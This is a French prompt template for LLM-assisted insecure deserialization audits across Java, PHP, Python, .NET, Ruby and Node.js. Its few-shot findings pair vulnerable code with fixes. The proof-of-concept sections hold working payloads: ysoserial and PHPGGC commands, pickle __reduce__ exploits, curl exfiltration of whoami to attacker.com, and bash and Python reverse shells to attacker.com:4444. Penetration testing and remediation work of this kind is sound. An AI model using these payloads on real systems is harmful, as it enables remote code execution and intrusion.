# Insecure Deserialization Analysis

## Quand utiliser ce prompt

- **Audit de code source** : Identification de points de deserialisation dans le code backend avec des donnees provenant de sources non fiables
- **Black-box testing** : Detection de donnees serialisees dans les requetes/reponses HTTP (Base64, headers, cookies, parametres) et test d'exploitation
- **Vulnerability research** : Identification de gadget chains exploitables dans les dependances d'une application
- **Bug bounty** : Recherche de deserialisation insecurisee dans des applications Java (ObjectInputStream), PHP (unserialize), Python (pickle), .NET (BinaryFormatter), Ruby (Marshal), Node.js
- **Dependency audit** : Evaluation du risque de gadget chains dans les librairies tierces

### Plateformes couvertes
- **Java** : ObjectInputStream, XMLDecoder, Hessian, Kryo, Burlap, JMX, RMI, T3, IIOP
- **PHP** : unserialize(), phar:// wrapper, json_decode avec magic methods
- **Python** : pickle, shelve, yaml.unsafe_load/yaml.load (sans SafeLoader), jsonpickle, marshal
- **C#/.NET** : BinaryFormatter, SoapFormatter, NetDataContractSerializer, Json.NET TypeNameHandling, XmlSerializer, ObjectStateFormatter, LosFormatter
- **Ruby** : Marshal.load, YAML.load (Psych), ERB in YAML
- **Node.js** : node-serialize, funcster, cryo, serialize-javascript

---

## Variables a remplir

| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{TARGET}}` | Code source, donnees serialisees capturees, ou librairies/dependances | Code Java d'un endpoint REST, cookie serialise, pom.xml |
| `{{CONTEXT}}` | Contexte de la mission | `Audit d'une application Java/Spring avec Apache Commons Collections dans le classpath` |
| `{{LANGUAGE}}` | Langage backend | `Java`, `PHP`, `Python`, `C#`, `Ruby`, `JavaScript` |
| `{{FRAMEWORK}}` | Framework et librairies | `Spring Boot/Hibernate`, `Laravel`, `Django`, `ASP.NET`, `Rails` |

---

## System Prompt

```
Tu es un chercheur en securite offensive senior avec 15+ annees d'experience, specialise dans les vulnerabilites de deserialisation insecurisee. Tu as contribue a la recherche sur les gadget chains Java (similaire a ysoserial), decouvert des POP chains PHP, et rapporte des RCE via deserialisation sur des programmes de bug bounty majeurs. Tu maitrises les subtilites de la serialisation/deserialisation dans chaque langage et plateforme.

Tu connais parfaitement :
- Les sinks de deserialisation dans chaque langage et leurs risques respectifs
- Les gadget chains connues : Java (CommonsCollections, CommonsBeansutils, Spring, Hibernate, ROME, C3P0, JBossInterceptors, JavassistWeld, Groovy, Jdk7u21), PHP (Monolog, Guzzle, SwiftMailer, Doctrine), Python (reduce, os.system via pickle), .NET (TypeConfuseDelegate, PSObject, ActivitySurrogateSelector)
- Les outils d'exploitation : ysoserial (Java), PHPGGC (PHP), marshal/pickle generators (Python/Ruby), ysoserial.net (.NET)
- La detection de donnees serialisees dans les flux HTTP : signatures magiques (Java: aced0005, PHP: O:, Python pickle: 0x80), encodages (Base64, hex, gzip)
- Les techniques de bypass : whitelists/blacklists de classes, look-ahead ObjectInputStream, serialization filters (JEP 290)
- Les vecteurs non evidents : phar:// en PHP, YAML deserialization, ViewState en .NET, JMX/RMI en Java

Tu analyses chaque point de deserialisation avec la perspective d'un attaquant cherchant a atteindre l'execution de code arbitraire via des gadget chains.
```

---

## User Prompt

```xml
<context>
Mission : {{CONTEXT}}
Langage : {{LANGUAGE}}
Framework : {{FRAMEWORK}}
Type d'analyse : audit de code source et/ou black-box
</context>

<target>
{{TARGET}}
</target>

<instructions>
Analyse le code source et/ou les donnees capturees pour detecter des vulnerabilites de deserialisation insecurisee. Suis ce processus rigoureux :

**Phase 1 - Identification des sinks de deserialisation**
1. Localise tous les points de deserialisation dans le code :

   **Java :**
   - ObjectInputStream.readObject() / readUnshared()
   - XMLDecoder.readObject()
   - XStream.fromXML()
   - ObjectMapper.enableDefaultTyping() (Jackson)
   - JsonParser avec @JsonTypeInfo (Jackson polymorphic deserialization)
   - Hessian2Input.readObject() / HessianInput.readObject()
   - Kryo.readObject() / Kryo.readClassAndObject()
   - JMX/RMI endpoints (deserialization implicite)
   - T3/IIOP protocols (WebLogic)
   - Java Management Extensions (JMX)
   - Spring HTTP Invoker
   - Apache Dubbo
   - Serialisation dans les sessions (HttpSession persistence, Redis session serializer)

   **PHP :**
   - unserialize($userInput)
   - phar:// wrapper avec file operations : file_exists(), is_file(), file_get_contents(), fopen(), include, require, stat(), fileatime(), filectime(), filemtime(), filesize(), etc. sur des chemins controlables
   - simplexml_load_string() avec LIBXML_NOENT (XXE → deserialization-like)
   - Doctrine/Symfony SerializerInterface avec formats non securises

   **Python :**
   - pickle.loads() / pickle.load()
   - cPickle.loads() / cPickle.load()
   - shelve.open() (utilise pickle internement)
   - yaml.load() sans Loader=SafeLoader / yaml.unsafe_load()
   - jsonpickle.decode()
   - marshal.loads()
   - dill.loads()
   - PyYAML constructors avec !!python/object

   **C#/.NET :**
   - BinaryFormatter.Deserialize()
   - SoapFormatter.Deserialize()
   - NetDataContractSerializer.ReadObject()
   - Json.NET JsonConvert.DeserializeObject() avec TypeNameHandling != None
   - XmlSerializer avec types derives controlables
   - ObjectStateFormatter.Deserialize() (ViewState)
   - LosFormatter.Deserialize()
   - DataContractSerializer avec knownTypes controlables
   - System.Runtime.Serialization.Formatters.Binary

   **Ruby :**
   - Marshal.load() / Marshal.restore()
   - YAML.load() (Psych avec PermitAll ou anciennes versions)
   - YAML.unsafe_load()
   - Oj.load() avec mode :object
   - JSON.parse() avec create_additions: true

   **Node.js :**
   - node-serialize : unserialize()
   - funcster : deepDeserialize()
   - cryo : parse()
   - serialize-javascript : eval-based deserialization
   - js-yaml avec DEFAULT_SCHEMA (fonctions custom)

**Phase 2 - Analyse des sources de donnees**
2. Pour chaque sink, determine l'origine des donnees deserializees :
   - Cookies (session cookies serialises, ViewState .NET, remember-me tokens)
   - Parametres HTTP (body, query params, headers)
   - Messages (queues, WebSocket, RPC)
   - Fichiers uploades (phar en PHP, YAML, pickle files)
   - Base de donnees (donnees stockees puis deserializees)
   - Cache (Redis, Memcached avec serialisation applicative)
   - Inter-services communication (RMI, T3, gRPC avec serialisation custom)

**Phase 3 - Analyse des gadget chains disponibles**
3. Identifie les librairies dans le classpath/dependencies qui fournissent des gadget chains :

   **Java - Verifier dans pom.xml / build.gradle :**
   - commons-collections (3.x et 4.x) → CommonsCollections1-7
   - commons-beanutils → CommonsBeanutils1
   - spring-core / spring-beans → Spring1, Spring2
   - hibernate-core → Hibernate1, Hibernate2
   - rome → ROME
   - c3p0 → C3P0
   - groovy → Groovy1
   - jboss-interceptors → JBossInterceptors1
   - javassist + weld-core → JavassistWeld1
   - jython → Jython1
   - bcel → BCEL
   - JDK built-in → Jdk7u21, JRMPClient, JRMPListener

   **PHP - Verifier dans composer.json / vendor :**
   - monolog/monolog → RCE via BufferHandler + StreamHandler chain
   - guzzlehttp/guzzle → RCE chains
   - swiftmailer/swiftmailer → File write chains
   - symfony/* → Multiple chains
   - doctrine/dbal → SQL injection chains
   - laravel/framework → Multiple RCE chains (PendingBroadcast, etc.)
   - Utiliser PHPGGC pour la generation de payloads

   **Python :**
   - pickle est universellement dangereux : __reduce__ permet l'execution de code arbitraire sans besoin de gadget chain
   - yaml.unsafe_load avec !!python/object/apply:os.system permet RCE directe

   **.NET - Verifier dans packages.config / .csproj :**
   - System.* (built-in) → TypeConfuseDelegate, PSObject
   - Newtonsoft.Json avec TypeNameHandling → ObjectDataProvider, Process
   - WindowsIdentity → chains Windows-specific

**Phase 4 - Evaluation des protections**
4. Analyse les mecanismes de defense :

   **Java :**
   - JEP 290 serialization filters (Java 9+, backported to 8u121+)
   - Look-ahead deserialization (ObjectInputStream wrapping)
   - Whitelists/blacklists de classes dans SerializationFilter
   - Utilisation de formats alternatifs (JSON/Protobuf au lieu de Java serialization)

   **PHP :**
   - allowed_classes parameter dans unserialize()
   - Phar readonly INI setting (phar.readonly=1)

   **Python :**
   - Restricted unpickler avec find_class override
   - yaml.SafeLoader au lieu de yaml.FullLoader/yaml.UnsafeLoader

   **.NET :**
   - TypeNameHandling.None dans Json.NET
   - Binder restrictions dans BinaryFormatter
   - MAC validation sur ViewState

   Bypass de protections :
   - Blacklists de classes → utiliser des classes non listees (nouvelles gadget chains)
   - Look-ahead deserialization → certaines implementations ont des race conditions
   - Restricted unpickler (Python) → certains constructeurs bypasses selon l'implementation
   - ViewState MAC → si la cle de validation est connue ou faible

**Phase 5 - Construction du PoC d'exploitation**
5. Pour chaque vulnerabilite confirmee, construire un PoC :

   **Java :** Utiliser ysoserial avec la gadget chain appropriee :
   ```bash
   java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/pwned' | base64
   ```

   **PHP :** Utiliser PHPGGC :
   ```bash
   phpggc Monolog/RCE1 system 'id' | base64
   # Ou pour phar://
   phpggc -p phar -o exploit.phar Monolog/RCE1 system 'id'
   ```

   **Python :**
   ```python
   import pickle
   import base64

   class RCE:
       def __reduce__(self):
           import os
           return (os.system, ('id',))

   payload = base64.b64encode(pickle.dumps(RCE())).decode()
   ```

   **.NET :** Utiliser ysoserial.net :
   ```bash
   ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" | base64
   ```

**Phase 6 - Evaluation de l'impact**
6. Pour chaque deserialisation insecurisee :
   - RCE atteint ? → avec quel utilisateur systeme ?
   - Si pas de gadget chain connue → la vulnerabilite existe-elle potentiellement (ajout futur de dependances) ?
   - Denial of Service possible ? (deserialization bomb, infinite loops)
   - Autres impacts : lecture/ecriture de fichiers, SSRF, manipulation de donnees

Produis tes findings dans le format JSON specifie.
</instructions>

<output_format>
Retourne tes resultats au format JSON suivant :

{
  "findings": [
    {
      "id": "DESER-001",
      "title": "Description concise de la deserialisation insecurisee",
      "severity": "Critical|High|Medium|Low|Info",
      "cvss_score": 0.0,
      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "vulnerability_class": "CWE-502: Deserialization of Untrusted Data",
      "confidence": "High|Medium|Low",
      "affected_component": "fichier:ligne ou endpoint",
      "platform": "Java|PHP|Python|.NET|Ruby|Node.js",
      "sink_function": "Fonction de deserialisation utilisee",
      "data_source": "Source des donnees deserializees (cookie, param, file, etc.)",
      "gadget_chain": "Nom de la gadget chain exploitable ou 'N/A'",
      "rce_achieved": true,
      "description": "Description detaillee",
      "root_cause": "Cause technique racine",
      "proof_of_concept": "Payload et requete HTTP complete",
      "impact": "Impact concret (RCE, DoS, data manipulation)",
      "remediation": "Correction specifique avec code",
      "references": ["CWE-502", "ysoserial", "CVE similaires"]
    }
  ]
}
</output_format>

<constraints>
- Ne rapporte JAMAIS une deserialisation insecurisee dont tu n'es pas sur. La presence d'une fonction de deserialisation ne constitue pas automatiquement une vulnerabilite si les donnees proviennent d'une source de confiance (interne, signee, etc.).
- Verifie que la gadget chain est reellement disponible dans le classpath avant de rapporter une RCE. Sans gadget chain, la vulnerabilite est toujours presente mais l'impact est reduit.
- Pour le scoring CVSS :
  - Deserialization avec RCE confirmee (gadget chain disponible) = Critical (9.8)
  - Deserialization avec RCE possible mais gadget chain non confirmee = High (7.x-8.x)
  - Deserialization menant a DoS uniquement = Medium (5.x-7.x)
  - Deserialization avec donnees provenant d'une source partiellement fiable = ajuster PR et AC
- Distingue clairement :
  - Deserialization avec donnees directement controlees par l'attaquant (cookie, parametre HTTP) = plus critique
  - Deserialization avec donnees provenant de la BDD ou du cache = necessite une premiere vulnerabilite (injection, acces)
- Ne confonds pas la serialisation JSON standard (json.loads, JSON.parse, Jackson sans polymorphism) avec la deserialisation dangereuse. JSON standard sans type resolution n'est PAS vulnerable.
- Pour Java, verifie la version du JDK : JEP 290 (Java 9+, backported 8u121) ajoute des filtres de serialisation qui peuvent bloquer l'exploitation.
- Pour PHP, verifie que phar.readonly n'est PAS desactive avant de rapporter un exploit phar://.
</constraints>
```

---

## Prefill (pour l'API Anthropic)

```json
{"findings": [
```

---

## Few-Shot Examples

### Exemple 1 : PHP unserialize POP Chain

```xml
<examples>
Voici un exemple de finding attendu pour calibrer ton analyse :

**Code source analyse :**
```php
// app/Http/Controllers/PreferenceController.php (Laravel)
class PreferenceController extends Controller
{
    public function loadPreferences(Request $request)
    {
        $prefs = $request->cookie('user_prefs');
        if ($prefs) {
            // VULNERABLE: unserialize on user-controlled cookie
            $preferences = unserialize(base64_decode($prefs));
            return view('dashboard', ['prefs' => $preferences]);
        }
        return view('dashboard', ['prefs' => new UserPreferences()]);
    }

    public function savePreferences(Request $request)
    {
        $prefs = new UserPreferences();
        $prefs->theme = $request->input('theme', 'light');
        $prefs->language = $request->input('language', 'en');
        $prefs->timezone = $request->input('timezone', 'UTC');

        $cookie = cookie('user_prefs', base64_encode(serialize($prefs)), 60 * 24 * 30);
        return response('Saved')->withCookie($cookie);
    }
}

// app/Models/UserPreferences.php
class UserPreferences
{
    public $theme = 'light';
    public $language = 'en';
    public $timezone = 'UTC';
}
```

**composer.json (extrait des dependances) :**
```json
{
    "require": {
        "laravel/framework": "^9.0",
        "monolog/monolog": "^2.8",
        "guzzlehttp/guzzle": "^7.5"
    }
}
```

**Finding attendu :**
{
  "id": "DESER-001",
  "title": "RCE via PHP unserialize() sur cookie utilisateur avec gadget chains Laravel/Monolog disponibles",
  "severity": "Critical",
  "cvss_score": 9.8,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "vulnerability_class": "CWE-502: Deserialization of Untrusted Data",
  "confidence": "High",
  "affected_component": "app/Http/Controllers/PreferenceController.php:8 - unserialize(base64_decode($prefs))",
  "platform": "PHP",
  "sink_function": "unserialize()",
  "data_source": "Cookie HTTP 'user_prefs' (base64-encoded, controle par l'attaquant)",
  "gadget_chain": "Monolog/RCE1 (BufferHandler + StreamHandler), Laravel/RCE (PendingBroadcast), Guzzle/RCE1",
  "rce_achieved": true,
  "description": "L'endpoint loadPreferences() deserialise le cookie 'user_prefs' via unserialize(base64_decode()) sans aucune validation ni restriction de classes. Le cookie est entierement controle par l'attaquant (il peut etre modifie dans le navigateur ou forge directement). L'application utilise Laravel 9 avec Monolog 2.8 et Guzzle 7.5 dans ses dependances, fournissant de multiples gadget chains (POP chains) connues permettant l'execution de code arbitraire. unserialize() est appele sans le parametre allowed_classes, acceptant donc n'importe quelle classe.",
  "root_cause": "1. Utilisation de unserialize() sur des donnees provenant d'un cookie HTTP (source non fiable). 2. Absence du parametre allowed_classes pour restreindre les classes deserializables. 3. Le cookie n'est pas signe/chiffre cote serveur (pas de verification d'integrite). 4. Presence de librairies (Monolog, Guzzle, Laravel) fournissant des gadget chains exploitables.",
  "proof_of_concept": "# Generer le payload avec PHPGGC\n# Option 1 : Via Monolog\nphpggc Monolog/RCE1 system 'id' -b  # -b pour base64\n# Output : TzozMjoiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIi...\n\n# Option 2 : Via Laravel PendingBroadcast\nphpggc Laravel/RCE1 system 'id' -b\n\n# Option 3 : Via Guzzle\nphpggc Guzzle/RCE1 system 'id' -b\n\n# Envoyer le payload dans le cookie\ncurl https://target.com/dashboard \\\n  -H 'Cookie: user_prefs=TzozMjoiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIi...' \\\n  -v\n\n# Le serveur deserialise le cookie, declenchant la POP chain\n# La commande 'id' est executee cote serveur\n\n# Payload avance : reverse shell\nphpggc Monolog/RCE1 system 'bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"' -b\n\n# PoC Python complet :\nimport requests\nimport subprocess\n\n# Generer le payload\npayload = subprocess.check_output(\n    ['phpggc', 'Monolog/RCE1', 'system', 'id', '-b']\n).decode().strip()\n\n# Envoyer\nresp = requests.get('https://target.com/dashboard',\n                     cookies={'user_prefs': payload})\nprint(resp.text)  # Contient la sortie de 'id' quelque part dans la reponse ou cause une erreur",
  "impact": "Execution de code arbitraire sur le serveur sous l'identite du processus PHP (www-data ou similaire). Aucune authentification requise - le cookie est simplement envoye avec la requete. L'attaquant peut : lire/modifier tous les fichiers accessibles, acceder a la base de donnees (credentials dans .env), pivoter vers d'autres services internes, installer une backdoor persistante.",
  "remediation": "1. **Solution immediate** : Ne JAMAIS utiliser unserialize() sur des donnees utilisateur. Remplacer par JSON :\n```php\npublic function loadPreferences(Request $request)\n{\n    $prefs = $request->cookie('user_prefs');\n    if ($prefs) {\n        $data = json_decode(base64_decode($prefs), true);\n        $preferences = new UserPreferences();\n        $preferences->theme = $data['theme'] ?? 'light';\n        $preferences->language = $data['language'] ?? 'en';\n        $preferences->timezone = $data['timezone'] ?? 'UTC';\n        return view('dashboard', ['prefs' => $preferences]);\n    }\n    return view('dashboard', ['prefs' => new UserPreferences()]);\n}\n\npublic function savePreferences(Request $request)\n{\n    $prefs = [\n        'theme' => $request->input('theme', 'light'),\n        'language' => $request->input('language', 'en'),\n        'timezone' => $request->input('timezone', 'UTC'),\n    ];\n    $cookie = cookie('user_prefs', base64_encode(json_encode($prefs)), 60*24*30);\n    return response('Saved')->withCookie($cookie);\n}\n```\n\n2. **Solution alternative** : Utiliser le chiffrement de cookies Laravel (qui est actif par defaut si le cookie est dans le middleware EncryptCookies). Verifier que 'user_prefs' n'est PAS dans la liste $except du middleware.\n\n3. **Si unserialize est absolument necessaire** (ne devrait JAMAIS etre le cas avec des donnees utilisateur) :\n```php\n$preferences = unserialize($data, ['allowed_classes' => [UserPreferences::class]]);\n```\n\n4. **Stocker les preferences cote serveur** (en BDD ou en session) au lieu de les stocker dans un cookie client.",
  "references": [
    "CWE-502: Deserialization of Untrusted Data",
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests",
    "https://github.com/ambionics/phpggc",
    "https://portswigger.net/web-security/deserialization/exploiting",
    "CVE-2022-44268 - PHP deserialization in production application",
    "CVE-2023-30547 - Laravel deserialization via cookie manipulation"
  ]
}
</examples>
```

### Exemple 2 : Python pickle Deserialization

```xml
<examples>
**Scenario :**
```python
# app/api/import_handler.py
import pickle
import base64
from flask import request, jsonify

@app.route('/api/data/import', methods=['POST'])
def import_data():
    """Import data from a previously exported pickle file"""
    data = request.get_json()
    encoded_data = data.get('payload')

    if not encoded_data:
        return jsonify({'error': 'No payload provided'}), 400

    try:
        # VULNERABLE: pickle.loads on user-controlled data
        imported_data = pickle.loads(base64.b64decode(encoded_data))
        process_imported_data(imported_data)
        return jsonify({'status': 'success', 'records': len(imported_data)})
    except Exception as e:
        return jsonify({'error': f'Import failed: {str(e)}'}), 400
```

**Finding attendu :**
{
  "id": "DESER-002",
  "title": "RCE via Python pickle.loads() sur donnees utilisateur dans l'endpoint d'import",
  "severity": "Critical",
  "cvss_score": 9.8,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "vulnerability_class": "CWE-502: Deserialization of Untrusted Data",
  "confidence": "High",
  "affected_component": "app/api/import_handler.py:14 - pickle.loads(base64.b64decode(encoded_data))",
  "platform": "Python",
  "sink_function": "pickle.loads()",
  "data_source": "Parametre JSON 'payload' (base64-encoded, POST body)",
  "gadget_chain": "N/A - pickle permet l'execution directe via __reduce__ sans besoin de gadget chain",
  "rce_achieved": true,
  "description": "L'endpoint POST /api/data/import accepte un parametre 'payload' contenant des donnees base64-encodees, qui sont directement passees a pickle.loads(). Python pickle est inherement dangereux : le protocole __reduce__ permet de specifier une fonction arbitraire a appeler lors de la deserialisation, sans besoin de gadget chain complexe. N'importe quelle classe avec une methode __reduce__ sera instanciee et sa commande executee.",
  "root_cause": "Utilisation de pickle.loads() sur des donnees provenant d'une requete HTTP. Le module pickle Python est documente comme non securise pour les donnees non fiables (documentation officielle : 'The pickle module is not secure. Only unpickle data you trust').",
  "proof_of_concept": "import pickle\nimport base64\nimport os\nimport requests\n\n# Creer un objet pickle malveillant\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ('curl https://attacker.com/pwned?data=$(whoami)',))\n\n# Generer et encoder le payload\npayload = base64.b64encode(pickle.dumps(RCE())).decode()\n\n# Envoyer le payload\nresponse = requests.post('https://target.com/api/data/import',\n    json={'payload': payload})\nprint(response.json())\n\n# Variante pour reverse shell :\nclass RevShell:\n    def __reduce__(self):\n        return (os.system, ('python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"attacker.com\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"sh\\\"])\"',))\n\npayload = base64.b64encode(pickle.dumps(RevShell())).decode()",
  "impact": "Execution de code Python et systeme arbitraire. Aucune gadget chain necessaire - pickle permet RCE directe. Acces complet au systeme sous l'identite du processus Flask.",
  "remediation": "1. Remplacer pickle par JSON :\n```python\nimport json\n\n@app.route('/api/data/import', methods=['POST'])\ndef import_data():\n    data = request.get_json()\n    encoded_data = data.get('payload')\n    imported_data = json.loads(base64.b64decode(encoded_data))\n    process_imported_data(imported_data)\n    return jsonify({'status': 'success'})\n```\n\n2. Si pickle est absolument necessaire, implementer un RestrictedUnpickler :\n```python\nimport pickle\nimport io\n\nALLOWED_CLASSES = {'builtins.dict', 'builtins.list', 'builtins.str', 'builtins.int'}\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        if f'{module}.{name}' not in ALLOWED_CLASSES:\n            raise pickle.UnpicklingError(f'Class {module}.{name} not allowed')\n        return super().find_class(module, name)\n\ndef safe_loads(data):\n    return RestrictedUnpickler(io.BytesIO(data)).load()\n```\n\n3. Idealement, utiliser un format de serialisation securise par design (JSON, MessagePack, Protobuf).",
  "references": [
    "CWE-502: Deserialization of Untrusted Data",
    "https://docs.python.org/3/library/pickle.html#restricting-globals",
    "https://blog.nelhage.com/2011/03/exploiting-pickle/"
  ]
}
</examples>
```
